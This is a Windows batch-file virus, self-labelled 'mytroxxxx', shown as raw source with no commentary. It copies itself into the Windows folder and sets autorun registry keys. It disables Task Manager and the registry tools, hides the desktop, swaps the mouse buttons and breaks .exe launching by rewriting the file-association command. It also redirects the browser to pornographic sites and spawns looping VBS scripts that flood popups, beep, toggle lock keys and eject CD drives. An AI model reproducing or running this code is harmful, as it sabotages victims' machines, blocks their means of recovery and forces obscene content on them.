@echo hjigackeer
@echo Virus: mytroxxxx
@echo Autor: myass
@echo off
echo Chr(39)>%temp%\temp1.vbs
echo Chr(39)>%temp%\temp2.vbs
echo on error resume next > %temp%\temp.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp.vbs
reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodesktop /d 1 /freg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /d 1 /fset ¶§=%0
copy %¶§% %SystemRoot%\user32dll.bat
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http:\\www.freegayporn.com" /f
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v "IExplorer" /d 0 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoNavButtons" /d 1 /f
echo s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","fuck off">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","fuck off">>%temp%\temp.vbs
echo s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","fuck off">>%temp%\temp.vbs
echo on error resume next > %temp%\temp1.vbs
echo set FSO=createobject("scripting.filesystemobject")>>%temp%\temp1.vbs
echo do>>%temp%\temp1.vbs
echo fso.getfile ("A:\")>>%temp%\temp1.vbs
echo loop>>%temp%\temp1.vbs
echo on error resume next > %temp%\temp2.vbs
echo Set S = CreateObject("Wscript.Shell") >> %temp%\temp2.vbs
echo do>>%temp%\temp2.vbs
echo execute"S.Run ""%comspec% /c echo "" & Chr(7), 0, True">>%temp%\temp2.vbs
echo loop>>%temp%\temp2.vbs
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f
echo set application=createobject("shell.application")>>%temp%\temp.vbs
echo application.minimizeall>>%temp%\temp.vbs
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f
start rundll32 user32, SwapMouseButton
reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f
echo Set IE = CreateObject("InternetExplorer.Application") >> %temp%\temp.vbs
echo IE.Visible = 1 >> %temp%\temp.vbs
echo IE.Navigate "http:\\www.shittygirls.com" >> %temp%\temp.vbs
echo While IE.Busy >> %temp%\temp.vbs
echo WScript.Sleep 200 >> %temp%\temp.vbs
echo Wend >> %temp%\temp.vbs
echo i=13232323424234000000 >> %temp%\temp.vbs
echo while i^>0 or i^<0 >> %temp%\temp.vbs
echo S.popup "hahahahahahahah",100000, "C:/Windows/explorer.exe",2+16 >> %temp%\temp.vbs
echo i=i-1 >> %temp%\temp.vbs
echo wend >> %temp%\temp.vbs
echo do >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{capslock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{numlock}" >> %temp%\temp.vbs
echo wscript.sleep 200 >> %temp%\temp.vbs
echo s.sendkeys"{scrolllock}" >> %temp%\temp.vbs
echo loop>> %temp%\temp.vbs
echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> %temp%\temp.vbs
echo Set colCDROMs = oWMP.cdromCollection >> %temp%\temp.vbs
echo if colCDROMs.Count ^>= 1 then >> %temp%\temp.vbs
echo For i = 0 to colCDROMs.Count - 1 >> %temp%\temp.vbs
echo colCDROMs.Item(i).eject >> %temp%\temp.vbs
echo next >> %temp%\temp.vbs
echo End If >> %temp%\temp.vbs

start %temp%\temp.vbs
start %temp%\temp1.vbs
start %temp%\temp2.vbs